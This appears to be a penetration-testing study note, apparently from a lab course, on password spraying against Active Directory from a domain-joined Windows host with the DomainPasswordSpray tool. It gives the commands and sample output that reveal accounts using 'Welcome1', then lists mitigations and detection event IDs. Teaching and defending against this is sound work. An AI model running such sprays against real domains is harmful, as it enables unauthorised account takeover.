---
title: Password Spraying - Windows
draft: false
tags:
  - password-spray
---
If we have a foothold on domain-joined Windows host, we can use[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool.

If the host is authenticated to the domain, tool will automatically generate a user list from AD, query password policy, and exclude user accounts within one attempt of locking out.

## DomainPasswordSpray - Domain Joined

Since the host we are on is domain joined, it will automatically get user list from AD. 

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```


## Mitigation

- Multi-factor Authentication
- Restricting Access

## Detection

On DC's security log:

- [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)
- [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)


## Moving On

So we successfully attempted on password spray using password policy and userlist. Now with several sets of valid credentials in hand, we move to performing credentialed enumeration with various tools such as bloodhound.

